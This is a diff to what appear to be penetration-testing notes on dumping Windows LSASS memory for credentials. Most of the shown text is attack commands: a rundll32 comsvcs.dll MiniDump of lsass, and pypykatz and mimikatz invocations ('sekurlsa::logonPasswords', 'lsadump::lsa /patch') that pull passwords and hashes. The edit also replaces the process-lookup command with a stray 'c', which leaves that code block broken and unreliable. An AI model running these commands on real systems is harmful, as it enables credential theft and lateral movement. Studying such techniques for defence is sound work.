@@ -127,8 +127,7 @@ A file called lsass.DMP is created and saved in:  C:\Users\loggedonusersdirector
 
 ```powershell
 
-Get-Process lsass
-
+c
 rundll32 C:\windows\system32\comsvcs.dll, MiniDump <ID> C:\lsass.dmp full 
 ```
 ```cmd
@@ -136,6 +135,10 @@ rundll32 C:\windows\system32\comsvcs.dll, MiniDump <ID> C:\lsass.dmp full
 tasklist /svc | findstr lsass
 
 rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <ID> C:\lsass.dmp full
+```
+#### mimkatz
+```
+./mimikatz.exe "privilege::debug" "lsadump::lsa /patch"
 ```
 
 ### Using Pypykatz to Extract Credentials
@@ -145,7 +148,7 @@ rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <ID> C:\lsass.dmp full
 pypykatz lsa minidump /home/peter/Documents/lsass.dmp
 
 
-mimikatz.exe "minidump::minidump C:\Path\To\MemoryDump.dmp" "sekurlsa::logonPasswords" exit
+mimikatz.exe "sekurlsa::minidump c:\lsass.dmp" "sekurlsa::logonPasswords" exit
 ```
 #### MSV
 MSV is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. 
